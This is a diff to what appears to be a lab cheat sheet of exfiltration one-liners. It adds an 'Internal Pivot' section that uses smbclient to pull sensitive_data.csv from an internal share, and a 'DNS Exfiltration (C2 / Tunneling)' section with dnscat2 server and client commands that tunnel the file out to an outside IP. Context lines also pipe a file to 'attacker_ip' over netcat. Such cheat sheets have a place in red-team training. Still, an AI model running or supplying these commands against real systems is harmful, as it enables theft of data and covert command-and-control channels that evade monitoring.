@@ -13,6 +13,19 @@ netcat send file to remote host | nc attacker_ip 10000 -n -q1 < sensitive_data.c
 list open ports (check unusual outbound) | netstat -tulnp  
 list listening sockets (modern alternative) | ss -tuln  
 show active connections with process info | ss -tp   
+test outbound port connectivity | `nc -zvn 5.30.5.1 10000 -w1` 
+
+## Internal Pivot (SMB Exfil Path)  
+
+download file from SMB share | `smbclient //172.17.0.2/pci -c "get sensitive_data.csv" -N`  
+
+### DNS Exfiltration (C2 / Tunneling)  
+
+start dnscat server | `ruby /home/exfil/dnscat2/server/dnscat2.rb`  
+start dnscat client | `/labs/egress/dnscat2/dnscat --dns=server=5.30.5.1,port=53`  
+interact with dnscat session | `window -i 1`  
+download file via dns tunnel | `download sensitive_data.csv`  
+exit dnscat session | `exit`
 
 ## Encoding / Decoding
 
